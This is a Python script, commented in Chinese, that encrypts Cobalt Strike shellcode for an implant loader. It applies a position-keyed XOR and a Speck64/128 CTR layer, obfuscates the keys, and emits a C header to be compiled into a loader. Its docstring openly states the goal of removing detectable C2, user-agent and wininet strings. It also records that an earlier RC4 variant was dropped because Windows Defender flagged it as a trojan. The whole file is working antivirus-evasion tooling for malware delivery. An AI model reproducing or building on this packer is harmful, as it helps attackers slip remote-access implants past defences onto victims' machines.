#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
payload_gen.py —— Cobalt Strike shellcode 加密封装器（生成 C 头文件）
================================================================================
输入 : aaa.c（CS 的 `unsigned char buf[] = "\\x.."` 十六进制文本）或裸 .bin
输出 : payload_blob.h    —— 双层加密后的载荷 + 混淆密钥（供 loader.c #include）
       payload.bin.enc   —— 加密后的载荷
       xcheck_vector.txt —— Python↔C 交叉校验向量（C 端 crypto_selftest 复算同一向量）
       hashes.txt        —— 产物 sha256（证据三件之哈希）

加密架构（自内向外）:
  明文 shellcode
    └─ 层1 poskey_xor : b[i] ^= KX[i%32] ^ ((i*7 + 0x5A) & 0xFF)          (位置相关密钥流)
    └─ 层2 Speck-CTR  : Speck64/128 轮函数做 CTR 密钥流（16 字节密钥 KR，27 轮，alpha=8/beta=3）
  落到 PE 里的密文没有任何明文特征（URI / UA / C2 IP / wininet 字符串全部消失）

为什么不是 RC4（实测归因，2026-10-12）：RC4 的 KSA 例程本身就是 Defender 的静态特征
  —— v2_crypto 变体（含 RC4 解密例程、但从不解密、不申请内存、不执行）被判
  Trojan:Win64/TurtleLoader.CS!dha；换成 ARX 轮函数后该特征消失。

密钥加固: 不以明文常量出现——
  KX_OBF[i] = KX[i] ^ MASK[(i+AX)&7] ^ ((i*0x1D)&0xFF)
  KR_OBF[i] = KR[i] ^ MASK[(i+AR)&7] ^ ((i*0x2B)&0xFF)
  loader 运行时用同样的式子反推（MASK/AX/AR 每次构建随机）。

用法:
  python payload_gen.py aaa.c                 # aaa.c -> payload_blob.h
  python payload_gen.py --bin payload.bin      # 裸 shellcode 输入
  python payload_gen.py aaa.c --seed 12345     # 固定随机种子（可复现构建）
  python payload_gen.py aaa.c --stride 4       # 密文按步长打散摆放
"""
import argparse, datetime, hashlib, os, random, re, struct, sys

HERE = os.path.dirname(os.path.abspath(__file__))
MASK32 = 0xFFFFFFFF

# ------------------------------------------------------------------ 原语
def ror32(x, r):
    return ((x >> r) | (x << (32 - r))) & MASK32


def rol32(x, r):
    return ((x << r) | (x >> (32 - r))) & MASK32


def speck_schedule(key16):
    """Speck64/128 密钥编排：列表按 MSW 在前，k0 = 最低位字（与 crypto.c 完全一致）"""
    w = list(struct.unpack(">4I", key16))
    rk = [w[3]]
    l = [w[2], w[1], w[0]]
    for i in range(26):
        li = ((ror32(l[i], 8) + rk[i]) & MASK32) ^ i
        l.append(li)
        rk.append(rol32(rk[i], 3) ^ li)
    return rk


def speck_block(rk, x, y):
    for i in range(27):
        x = ((ror32(x, 8) + y) & MASK32) ^ rk[i]
        y = rol32(y, 3) ^ x
    return x, y


def speck_keystream(key16, n, nonce):
    rk = speck_schedule(key16)
    out = bytearray()
    i = 0
    while len(out) < n:
        x, y = speck_block(rk, nonce & MASK32, i & MASK32)
        out += struct.pack(">2I", x, y)
        i += 1
    return bytes(out[:n])


def speck_ctr_xor(data, key16, nonce):
    ks = speck_keystream(key16, len(data), nonce)
    return bytes(a ^ b for a, b in zip(data, ks))


def poskey_xor(data, kx):
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ kx[i % 32] ^ ((i * 7 + 0x5A) & 0xFF)
    return bytes(out)


# ------------------------------------------------------- shellcode 提取
def parse_c_array(path):
    with open(path, "rb") as f:
        raw = f.read()
    text = None
    for enc in ("utf-8-sig", "utf-8", "gbk", "latin-1"):
        try:
            text = raw.decode(enc)
            break
        except Exception:
            continue
    if text is None:
        raise SystemExit("[!] 无法解码源文件")
    hits = re.findall(r"\\x([0-9a-fA-F]{2})", text)
    if not hits:
        raise SystemExit("[!] 源文件里没找到 \\xNN 形式的 shellcode 字节")
    return bytes(int(h, 16) for h in hits)


# --------------------------------------------------------------- 头文件
def c_array(name, data, per_line=16, const=True):
    q = "const " if const else ""
    lines = ["%sunsigned char %s[%d] = {" % (q, name, len(data))]
    for off in range(0, len(data), per_line):
        lines.append("    " + " ".join("0x%02X," % b for b in data[off:off + per_line]))
    lines.append("};")
    return "\n".join(lines)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("src", nargs="?", default=os.path.join(HERE, "aaa.c"),
                    help="aaa.c 或（配合 --bin）裸 shellcode 文件")
    ap.add_argument("--bin", action="store_true", help="src 是裸二进制而不是 C 数组文本")
    ap.add_argument("--out", default=os.path.join(HERE, "payload_blob.h"))
    ap.add_argument("--name", default="g_sc_blob", help="密文数组名")
    ap.add_argument("--seed", type=int, default=None, help="固定随机种子=可复现构建")
    ap.add_argument("--stride", type=int, default=1, help="密文落盘步长（>1 打散内存布局）")
    ap.add_argument("--dump-plain", action="store_true",
                    help="同时落盘明文 shellcode（注意 Windows Defender 会阻断对该文件的读取）")
    a = ap.parse_args()

    rnd = random.Random(a.seed) if a.seed is not None else random.Random(os.urandom(32))

    pt = open(a.src, "rb").read() if a.bin else parse_c_array(a.src)
    if len(pt) < 64:
        raise SystemExit("[!] 载荷过短(%d)，疑似提取失败" % len(pt))

    kx = bytes(rnd.randrange(256) for _ in range(32))
    kr = bytes(rnd.randrange(256) for _ in range(16))
    nonce = rnd.randrange(1, MASK32)
    mask = bytes(rnd.randrange(256) for _ in range(8))
    ax, ar = rnd.randrange(8), rnd.randrange(8)

    enc = speck_ctr_xor(poskey_xor(pt, kx), kr, nonce)

    if a.stride > 1:
        storage_len = len(enc) * a.stride
        storage = bytearray(rnd.randrange(256) for _ in range(storage_len))
        for i, b in enumerate(enc):
            storage[i * a.stride] = b
        storage = bytes(storage)
    else:
        storage_len, storage = len(enc), enc

    kx_obf = bytes((kx[i] ^ mask[(i + ax) & 7] ^ ((i * 0x1D) & 0xFF)) & 0xFF for i in range(32))
    kr_obf = bytes((kr[i] ^ mask[(i + ar) & 7] ^ ((i * 0x2B) & 0xFF)) & 0xFF for i in range(16))

    # 生成期自校验：按 loader 的式子反推密钥并解密，必须逐字节还原明文
    rkx = bytes((kx_obf[i] ^ mask[(i + ax) & 7] ^ ((i * 0x1D) & 0xFF)) & 0xFF for i in range(32))
    rkr = bytes((kr_obf[i] ^ mask[(i + ar) & 7] ^ ((i * 0x2B) & 0xFF)) & 0xFF for i in range(16))
    chk = poskey_xor(speck_ctr_xor(storage[::a.stride] if a.stride > 1 else storage, rkr, nonce), rkx)
    assert rkx == kx and rkr == kr, "密钥反推不一致"
    assert chk == pt, "自校验解密失败：%d/%d 字节不一致" % (
        sum(1 for x, y in zip(chk, pt) if x != y), len(pt))

    guard = "G_%s_GUARD" % hashlib.sha1(enc).hexdigest()[:8].upper()
    h = []
    h.append("/* payload_blob.h —— 由 payload_gen.py 自动生成，勿手改")
    h.append(" * 源载荷    : %s (%d bytes)" % (os.path.basename(a.src), len(pt)))
    h.append(" * 明文sha256: %s" % hashlib.sha256(pt).hexdigest())
    h.append(" * 密文sha256: %s" % hashlib.sha256(storage).hexdigest())
    h.append(" * 加密      : poskey_xor -> Speck64/128 CTR(27轮) ; stride=%d ; nonce=0x%08X"
             % (a.stride, nonce))
    h.append(" * 生成时间  : %s" % datetime.datetime.now().isoformat(timespec="seconds"))
    h.append(" */")
    h.append("#ifndef %s" % guard)
    h.append("#define %s" % guard)
    h.append("")
    h.append("#define SC_PLAIN_LEN    %d" % len(pt))
    h.append("#define SC_STORAGE_LEN  %d" % storage_len)
    h.append("#define SC_STRIDE       %d" % a.stride)
    h.append("#define SC_NONCE        0x%08Xu" % nonce)
    h.append("#define SC_CIPHER_ID    2   /* 1=RC4(已弃用, 被 Defender 命中) 2=Speck64/128-CTR */")
    h.append("")
    h.append("/* 混淆后的密钥材料（无明文密钥常量） */")
    h.append(c_array("g_key_mask", mask))
    h.append("#define KEY_XOR_SHIFT %d" % ax)
    h.append("#define KEY_BLK_SHIFT %d" % ar)
    h.append(c_array("g_key_xor_obf", kx_obf))
    h.append(c_array("g_key_blk_obf", kr_obf))
    h.append("")
    h.append("/* 加密载荷（明文 shellcode 不出现在文件里） */")
    h.append(c_array(a.name, storage, const=False))
    h.append("")
    h.append("#endif /* %s */" % guard)

    with open(a.out, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(h) + "\n")

    eout = os.path.join(HERE, "payload.bin.enc")
    if a.dump_plain:
        try:
            open(os.path.join(HERE, "payload.bin"), "wb").write(pt)
        except OSError as e:
            print("[!] 明文落盘被拦（AV 实时防护）: %s" % e)
    open(eout, "wb").write(storage)

    # Python↔C 交叉校验向量（crypto_selftest 复算同一向量）
    xkey = bytes(range(16))
    xnonce = 0x12345678
    xks = speck_keystream(xkey, 32, xnonce)
    xpath = os.path.join(HERE, "xcheck_vector.txt")
    with open(xpath, "w", encoding="utf-8") as f:
        f.write("key=%s\nnonce=0x%08X\nkeystream32=%s\n" % (xkey.hex(), xnonce, xks.hex()))

    lines = []
    for p in ([a.out, os.path.join(HERE, "payload.bin")] if a.dump_plain else [a.out]) + [eout, xpath]:
        if not os.path.exists(p):
            continue
        try:
            lines.append("%s  %s  %d bytes" % (hashlib.sha256(open(p, "rb").read()).hexdigest(),
                                               p, os.path.getsize(p)))
        except OSError:
            lines.append("READ-BLOCKED(AV filter)  %s  %d bytes" % (p, os.path.getsize(p)))
    open(os.path.join(HERE, "hashes.txt"), "w", encoding="utf-8").write("\n".join(lines) + "\n")

    print("[+] payload   : %d bytes plaintext (sha256 %s)" % (len(pt), hashlib.sha256(pt).hexdigest()))
    print("[+] storage   : %d bytes (stride=%d), nonce=0x%08X" % (storage_len, a.stride, nonce))
    print("[+] keys      : kx=32B blk=16B mask=8B shifts=(%d,%d) (self-verified)" % (ax, ar))
    print("[+] cipher    : Speck64/128 CTR (27 rounds, alpha=8, beta=3)")
    print("[+] header    : %s" % a.out)
    print("[+] encrypted : %s" % eout)
    print("[+] xcheck    : %s" % xpath)
    for l in lines:
        print("      " + l)
    return 0


if __name__ == "__main__":
    sys.exit(main())
